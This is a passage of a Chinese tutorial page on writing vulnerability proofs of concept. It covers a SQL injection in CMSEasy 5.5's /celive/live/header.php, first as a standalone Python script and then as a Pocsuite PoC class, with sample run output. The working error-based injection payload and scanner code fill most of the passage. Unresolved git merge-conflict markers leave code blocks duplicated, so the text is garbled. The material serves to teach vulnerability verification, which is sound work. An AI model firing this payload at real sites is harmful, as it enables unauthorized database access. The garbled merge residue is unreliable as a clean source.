class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def verify(url):</span><br><span class="line">    target = &quot;%s/celive/live/header.php&quot; % url</span><br><span class="line">    # 要发送的数据</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        &apos;xajax&apos;: &apos;LiveMessage&apos;,</span><br><span class="line">        &apos;xajaxargs[0][name]&apos;: &quot;1&apos;,(SELECT 1 FROM (select count(*),concat(&quot;</span><br><span class="line">                              &quot;floor(rand(0)*2),(select md5(233)))a from &quot;</span><br><span class="line">                              &quot;information_schema.tables group by a)b),&quot;</span><br><span class="line">                              &quot;&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        # 发送 HTTP 请求</span><br><span class="line">        req = urllib2.Request(target, data=urllib.urlencode(post_data))</span><br><span class="line">        response = urllib2.urlopen(req)</span><br><span class="line">        if response:</span><br><span class="line">            # 处理 响应</span><br><span class="line">            data = response.read()</span><br><span class="line">            if hashlib.md5(&apos;233&apos;).hexdigest() in data:</span><br><span class="line">                print &quot;%s is vulnerable&quot; % target</span><br><span class="line">            else:</span><br><span class="line">                print &quot;%s is not vulnerable&quot; % target</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print &quot;Something happend...&quot;</span><br><span class="line">        print e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    args = sys.argv</span><br><span class="line">    url = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if len(args) == 2:</span><br><span class="line">        url = args[1]</span><br><span class="line">        verify(url)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;Usage: python %s url&quot; % (args[0])</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>将上述代码保存为 <code>2_2_2.py</code> 然后执行 <code>python 2_2_2.py http://localhost/cmseasy/</code> 可以看到下面的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ python 2_2_2.py http://localhost/cmseasy/</span><br><span class="line">http://localhost/cmseasy//celive/live/header.php is vulnerable</span><br></pre></td></tr></table></figure>
<p>然后我们试着换一个其它的 url ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ python 2_2_2.py http://localhost/</span><br><span class="line">Something happend...</span><br><span class="line">HTTP Error 404: Not Found</span><br></pre></td></tr></table></figure>
=======
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(url)</span>:</span></span><br><span class="line">    target = <span class="string">"%s/celive/live/header.php"</span> % url</span><br><span class="line">    <span class="comment"># 要发送的数据</span></span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'xajax'</span>: <span class="string">'LiveMessage'</span>,</span><br><span class="line">        <span class="string">'xajaxargs[0][name]'</span>: <span class="string">"1',(SELECT 1 FROM (select count(*),concat("</span></span><br><span class="line">                              <span class="string">"floor(rand(0)*2),(select md5(233)))a from "</span></span><br><span class="line">                              <span class="string">"information_schema.tables group by a)b),"</span></span><br><span class="line">                              <span class="string">"'','','','1','127.0.0.1','2') #"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送 HTTP 请求</span></span><br><span class="line">        req = urllib2.Request(target, data=urllib.urlencode(post_data))</span><br><span class="line">        response = urllib2.urlopen(req)</span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            <span class="comment"># 处理 响应</span></span><br><span class="line">            data = response.read()</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(<span class="string">'233'</span>).hexdigest() <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"%s is vulnerable"</span> % target</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"%s is not vulnerable"</span> % target</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Something happend..."</span></span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    args = sys.argv</span><br><span class="line">    url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(args) == <span class="number">2</span>:</span><br><span class="line">        url = args[<span class="number">1</span>]</span><br><span class="line">        verify(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: python %s url"</span> % (args[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>将上述代码保存为 <code>2_2_2.py</code> 然后执行 <code>python 2_2_2.py http://localhost/cmseasy/</code> 可以看到下面的结果：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ python <span class="number">2_2_2</span>.py <span class="symbol">http:</span>/<span class="regexp">/localhost/cmseasy</span><span class="regexp">/</span><br><span class="line">http:/</span><span class="regexp">/localhost/cmseasy</span><span class="regexp">//celive</span><span class="regexp">/live/header</span>.php is vulnerable</span><br></pre></td></tr></table></figure>
<p>然后我们试着换一个其它的 url ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ python <span class="number">2</span>_2_2.py http:<span class="comment">//localhost/</span></span><br><span class="line">Something happend...</span><br><span class="line">HTTP Error <span class="number">404</span>: Not Found</span><br></pre></td></tr></table></figure>
>>>>>>> github/master
<p>呐，这时候返回了 404 错误，嗯，代码<code>2_2_2.py</code> 就是这个漏洞的 python 语言的 PoC 了。</p>
<p><strong>下面简单讲一下这个代码做了什么：</strong></p>
<p>main 方法里面大概处理了一下用户的输入</p>
<p>verify 方法里面先是拼接了一下要发送的目的 url, 然后把 post_data(也就是我们的 Payload)发送到目的 url, 最后再处理了一下服务端的响应页面。</p>
<blockquote>
<p>怎么样？是不是感觉整个过程就像是你自己在用浏览器去手工验证一样？</p>
</blockquote>
<p>当然上述的代码，实际运行的时候还是需要改进的，毕竟有很多细节的地方还需要再完善。比如说我们的输入部分，试想一下啊，每一个 PoC 都要你自己去写一下这个输入代码，假设你有 10000W 个 PoC, 天呐这要浪费我多少存储空间啊，这太冗佘了吧，而且你想让每个人都能想到那么多特殊情况，是不是很不现实，毕竟有很多人想不到这么些个情况。</p>
<blockquote>
<p>你说，老子有钱，不怕占空间。</p>
</blockquote>
<p>好，那再看，上面的那些代码，输出结果的时候，就用了一个 print , 显然这样的输出很不友好，而且一个 PoC 还不能支持批量扫描，如果你想加载多个 PoC 去扫描多个目标的时候，这样的代码会让你抓狂的。</p>
<p>于是，就有了 PoC 框架，有效避免了你重复造轮子，帮你处理输入，帮你处理输出，专业的事情交给专业的人去做，然后 BalaBala…</p>
<<<<<<< HEAD
<h3 id="2-2-4-基于-Pocsuite-框架"><a href="#2-2-4-基于-Pocsuite-框架" class="headerlink" title="2.2.4 基于 Pocsuite 框架"></a>2.2.4 基于 Pocsuite 框架</h3><p>代码<code>2_2_2.py</code>中使用了 Python 标准库中的 urllib2 来发送 HTTP 请求，而在 Pocsuite 中，框架要求使用 Pocsuite 框架封装好的 req , 其实它就是 python 的 requests 库，具体的用法直接看 requests 帮助文档就好了。</p>
<p>为什么不让你在 PoC 中直接 <code>import requests</code> 呢？上面我已经说过了，哦，好像没说，我们在批量的时候，有一些站为了防机器人，需要看你有没有 HTTP 请求头的，比如有一些 WAF 会检测请求中是否有 User-Agent, 对，就是怕有些人忘记了，于是框架就处理了这些啊。再比如，你这个 PoC 中需要 Cookie ，你总不能在扫描的时候弹一个框让用户写 Cookie 吧，那你批量的时候不累死用户了。对，这些东西，框架都帮你解决了。</p>
<p>好了看代码:</p>
<p>代码 <code>2_2_3.py</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase, Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class CmsEasyPoC(POCBase):</span><br><span class="line">    vulID = &apos;88979&apos;</span><br><span class="line">    version = &apos;1&apos;</span><br><span class="line">    author = [&apos;Medici.Yan&apos;]</span><br><span class="line">    vulDate = &apos;2014-10-22&apos;</span><br><span class="line">    createDate = &apos;2015-12-28&apos;</span><br><span class="line">    updateDate = &apos;2015-12-28&apos;</span><br><span class="line">    references = [&apos;http://wooyun.org/bugs/wooyun-2010-070827&apos;]</span><br><span class="line">    name = &apos;CMSEasy 5.5 /celive/live/header.php SQL注入漏洞 POC&apos;</span><br><span class="line">    appPowerLink = &apos;http://www.cmseasy.cn/&apos;</span><br><span class="line">    appName = &apos;CMSEasy&apos;</span><br><span class="line">    appVersion = &apos;5.5&apos;</span><br><span class="line">    vulType = &apos;SQL Injection&apos;</span><br><span class="line">    desc = &apos;&apos;&apos;</span><br><span class="line">           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接</span><br><span class="line">           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。</span><br><span class="line">           此注入为报错注入，可以通过UpdateXML函数进行注入。</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    samples = [&apos;&apos;]</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        target = self.url + &apos;/celive/live/header.php&apos;</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            &apos;xajax&apos;: &apos;LiveMessage&apos;,</span><br><span class="line">            &apos;xajaxargs[0][name]&apos;: &quot;1&apos;,(SELECT 1 FROM (select count(*),concat(&quot;</span><br><span class="line">                                  &quot;floor(rand(0)*2),(select md5(233)))a from &quot;</span><br><span class="line">                                  &quot;information_schema.tables group by a)b),&quot;</span><br><span class="line">                                  &quot;&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        # 使用 requests 发送 post 请求</span><br><span class="line">        response = req.post(target, data=post_data, timeout=10)</span><br><span class="line">        content = response.content</span><br><span class="line">        # 这个 e165421110ba03099a1c0393373c5b43 就是 md5(233) 的值</span><br><span class="line">        if &apos;e165421110ba03099a1c0393373c5b43&apos; in content:</span><br><span class="line">            result = &#123;&apos;VerifyInfo&apos;: &#123;&#125;&#125;</span><br><span class="line">            result[&apos;VerifyInfo&apos;][&apos;URL&apos;] = target</span><br><span class="line"></span><br><span class="line">        return self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">    def parse_result(self, result):</span><br><span class="line">        output = Output(self)</span><br><span class="line"></span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&apos;Internet Nothing returned&apos;)</span><br><span class="line"></span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(CmsEasyPoC)</span><br></pre></td></tr></table></figure>
=======
<h3 id="2-2-4_基于_Pocsuite_框架">2.2.4 基于 Pocsuite 框架</h3><p>代码<code>2_2_2.py</code>中使用了 Python 标准库中的 urllib2 来发送 HTTP 请求，而在 Pocsuite 中，框架要求使用 Pocsuite 框架封装好的 req , 其实它就是 python 的 requests 库，具体的用法直接看 requests 帮助文档就好了。</p>
<p>为什么不让你在 PoC 中直接 <code>import requests</code> 呢？上面我已经说过了，哦，好像没说，我们在批量的时候，有一些站为了防机器人，需要看你有没有 HTTP 请求头的，比如有一些 WAF 会检测请求中是否有 User-Agent, 对，就是怕有些人忘记了，于是框架就处理了这些啊。再比如，你这个 PoC 中需要 Cookie ，你总不能在扫描的时候弹一个框让用户写 Cookie 吧，那你批量的时候不累死用户了。对，这些东西，框架都帮你解决了。</p>
<p>好了看代码:</p>
<p>代码 <code>2_2_3.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CmsEasyPoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'88979'</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = [<span class="string">'Medici.Yan'</span>]</span><br><span class="line">    vulDate = <span class="string">'2014-10-22'</span></span><br><span class="line">    createDate = <span class="string">'2015-12-28'</span></span><br><span class="line">    updateDate = <span class="string">'2015-12-28'</span></span><br><span class="line">    references = [<span class="string">'http://wooyun.org/bugs/wooyun-2010-070827'</span>]</span><br><span class="line">    name = <span class="string">'CMSEasy 5.5 /celive/live/header.php SQL注入漏洞 POC'</span></span><br><span class="line">    appPowerLink = <span class="string">'http://www.cmseasy.cn/'</span></span><br><span class="line">    appName = <span class="string">'CMSEasy'</span></span><br><span class="line">    appVersion = <span class="string">'5.5'</span></span><br><span class="line">    vulType = <span class="string">'SQL Injection'</span></span><br><span class="line">    desc = <span class="string">'''</span><br><span class="line">           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接</span><br><span class="line">           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。</span><br><span class="line">           此注入为报错注入，可以通过UpdateXML函数进行注入。</span><br><span class="line">    '''</span></span><br><span class="line">    samples = [<span class="string">''</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        target = self.url + <span class="string">'/celive/live/header.php'</span></span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">'xajax'</span>: <span class="string">'LiveMessage'</span>,</span><br><span class="line">            <span class="string">'xajaxargs[0][name]'</span>: <span class="string">"1',(SELECT 1 FROM (select count(*),concat("</span></span><br><span class="line">                                  <span class="string">"floor(rand(0)*2),(select md5(233)))a from "</span></span><br><span class="line">                                  <span class="string">"information_schema.tables group by a)b),"</span></span><br><span class="line">                                  <span class="string">"'','','','1','127.0.0.1','2') #"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 使用 requests 发送 post 请求</span></span><br><span class="line">        response = req.post(target, data=post_data, timeout=<span class="number">10</span>)</span><br><span class="line">        content = response.content</span><br><span class="line">        <span class="comment"># 这个 e165421110ba03099a1c0393373c5b43 就是 md5(233) 的值</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'e165421110ba03099a1c0393373c5b43'</span> <span class="keyword">in</span> content:</span><br><span class="line">            result = &#123;<span class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = target</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.parse_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_result</span><span class="params">(self, result)</span>:</span></span><br><span class="line">        output = Output(self)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'Internet Nothing returned'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(CmsEasyPoC)</span><br></pre></td></tr></table></figure>
>>>>>>> github/master
<p>将上面的代码保存为 <code>2_2_3.py</code> 然后下载 Pocsuite 框架后，用 Pocsuite 框架执行我们的 PoC, 执行结果如图 2-5:</p>
<p><img src="/images/poc_coding_img/2-5.png" alt="图 2-5"></p>
<p>本想在注释里面解释一下的，写完发现代码实在是太乱了，于是我还是放下面解释吧。</p>
<p>我们先看一下代码整体结构：</p>
<<<<<<< HEAD
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase, Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class CmsEasyPoC(POCBase):</span><br><span class="line">	def _verify(self):</span><br><span class="line">	    ...</span><br><span class="line">	def _attack(self):</span><br><span class="line">	    ...</span><br><span class="line">	def parse_result(self, result):</span><br><span class="line">	    ...</span><br><span class="line">register(CmsEasyPoC)</span><br></pre></td></tr></table></figure>
<p>最上面是引入一些类库，中部是一个 PoC 的类，继承自 POCBase 类，类中有两个函数，<code>_verify</code> 和 <code>_attack</code> ,这两个分别是 verify 和 attack 模式的入口函数，然后还有一个用户自己定义的函数 <code>parse_result</code> , 用于统一输出。</p>
<p>下面是针对每个具体的部分的说明，其实在人家框架里面已经有详细说明了，我重复一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase, Output</span><br><span class="line">from pocsuite.utils import register</span><br></pre></td></tr></table></figure>
<p>上面这些代码的意思是引入 pocsuite 的类库,当然你直接去按目录找肯定是找不到的，因为这个是老版本的 pocsuite 框架的目录结构，为了兼容老版本的就这么处理了。在加载的时候会自动将其替换成正确的路径。总结起来就一句话，人这么规定的你就这么写就对了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class CmsEasyPoC(POCBase):</span><br><span class="line">    vulID = &apos;88979&apos;</span><br><span class="line">    version = &apos;1&apos;</span><br><span class="line">    author = [&apos;Medici.Yan&apos;]</span><br><span class="line">    vulDate = &apos;2014-10-22&apos;</span><br><span class="line">    createDate = &apos;2015-12-28&apos;</span><br><span class="line">    updateDate = &apos;2015-12-28&apos;</span><br><span class="line">    references = [&apos;http://wooyun.org/bugs/wooyun-2010-070827&apos;]</span><br><span class="line">    name = &apos;CMSEasy 5.5 /celive/live/header.php SQL注入漏洞 POC&apos;</span><br><span class="line">    appPowerLink = &apos;http://www.cmseasy.cn/&apos;</span><br><span class="line">    appName = &apos;CMSEasy&apos;</span><br><span class="line">    appVersion = &apos;5.5&apos;</span><br><span class="line">    vulType = &apos;SQL Injection&apos;</span><br><span class="line">    desc = &apos;&apos;&apos;</span><br><span class="line">           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接</span><br><span class="line">           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。</span><br><span class="line">           此注入为报错注入，可以通过UpdateXML函数进行注入。</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    samples = [&apos;&apos;]</span><br></pre></td></tr></table></figure>
<p>这一部分代码，用于填写一些基础信息，PoC 多的情况下很有用的。根据漏洞实际情况填写就行了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def _verify(self):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    target = self.url + &apos;/celive/live/header.php&apos;</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        &apos;xajax&apos;: &apos;LiveMessage&apos;,</span><br><span class="line">        &apos;xajaxargs[0][name]&apos;: &quot;1&apos;,(SELECT 1 FROM (select count(*),concat(&quot;</span><br><span class="line">                              &quot;floor(rand(0)*2),(select md5(233)))a from &quot;</span><br><span class="line">                              &quot;information_schema.tables group by a)b),&quot;</span><br><span class="line">                              &quot;&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    # 使用 requests 发送 post 请求</span><br><span class="line">    response = req.post(target, data=post_data, timeout=10)</span><br><span class="line">    content = response.content</span><br><span class="line">    # 这个 e165421110ba03099a1c0393373c5b43 就是 md5(233) 的值</span><br><span class="line">    if &apos;e165421110ba03099a1c0393373c5b43&apos; in content:</span><br><span class="line">        result = &#123;&apos;VerifyInfo&apos;: &#123;&#125;&#125;</span><br><span class="line">        result[&apos;VerifyInfo&apos;][&apos;URL&apos;] = target</span><br><span class="line"></span><br><span class="line">    return self.parse_result(result)</span><br></pre></td></tr></table></figure>
<p>这里就是具体的 verify 的代码了。如果你看过 代码 <code>2_2_2.py</code> ，那么这段代码对你来说并不是问题，与代码 <code>2_2_2.py</code> 不同的是，这里使用了 req 来发送数据，还有一处不同的就是输出不再是 print 了，而是将我们要输出的信息保存在了一个叫 result 的字典里面，然后再调用 parse_result 将其输出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def _attack(self):</span><br><span class="line">    return self._verify()</span><br></pre></td></tr></table></figure>
<p>这里是 attack 模式的入口，这个是带有攻击性质的验证模式，也就是说，在这个函数里面，你可以直接注出管理员密码出来。相对于 <code>_verify</code> 来说，这个就稍微复杂了那么一丢丢。我偷了个懒不想写了，就让它返回 verify 了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def parse_result(self, result):</span><br><span class="line">    output = Output(self)</span><br><span class="line"></span><br><span class="line">    if result:</span><br><span class="line">        output.success(result)</span><br><span class="line">    else:</span><br><span class="line">        output.fail(&apos;Internet Nothing returned&apos;)</span><br><span class="line"></span><br><span class="line">    return output</span><br></pre></td></tr></table></figure>
<p>这个函数，是我自己定义的一个函数，有些人有问题，到底能不能自己定义函数，答案就是 能！记住，<code>_verify</code> 和 <code>_attack</code> 是入口，也就是框架要调用这两个函数，程序执行进来了以后，你想怎么调用就怎么调用。</p>
<p>关于这里面的代码，就是调用了框架输出的实例 Output 了而已。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register(CmsEasyPoC)</span><br></pre></td></tr></table></figure>
<p>这是最后，也是比较容易忽视的地方，一定要注意在最后要调用 register 来注册你的 PoC 类，这样框架才知道你这个类是 PoC 类，就会去调用它。</p>
<h3 id="2-2-5-基于-Bugscan-框架"><a href="#2-2-5-基于-Bugscan-框架" class="headerlink" title="2.2.5 基于 Bugscan 框架"></a>2.2.5 基于 Bugscan 框架</h3><p>讲完了 Pocsuite 现在就来说说怎么将我们的代码 <code>2_2_2.py</code> 改写成基于 Bugscan 框架的 PoC。</p>
=======
